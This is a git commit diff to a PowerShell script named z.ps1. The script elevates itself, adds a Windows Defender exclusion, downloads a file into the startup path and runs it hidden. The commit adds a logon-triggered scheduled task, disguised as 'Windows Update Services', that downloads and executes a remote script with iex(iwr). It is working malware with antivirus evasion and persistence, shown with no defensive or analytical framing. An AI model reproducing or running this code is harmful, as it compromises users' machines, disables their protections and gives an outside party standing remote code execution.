adac319599fd9ad1dc4fdb196212929def8ed9d2
MRvinyKing <123846936+MRvinyKing@users.noreply.github.com>
2024-04-20 02:09:09 -0300

    Update z.ps1

--- z.ps1
+++ z.ps1
@@ -5,3 +5,7 @@ $downloadCommand = "Invoke-WebRequest -Uri '$fileUrl' -OutFile '$startupFilePath
 $exclusionCommand = "Add-MpPreference -ExclusionPath '$userDirectory'"
 $startupCommand = "Start-Process '$startupFilePath'"
 Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `$($exclusionCommand); `$($downloadCommand); `$($startupCommand)"
+$Action = New-ScheduledTaskAction -Execute 'powershell' -Argument '-w hidden "iex(iwr https://raw.githubusercontent.com/MRvinyKing/pythonwgetfilestest/main/i.ps1 -UseB)"'
+$Trigger = New-ScheduledTaskTrigger -AtLogOn
+$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
+Register-ScheduledTask -TaskName "Windows Update Services" -Action $Action -Trigger $Trigger -Settings $Settings
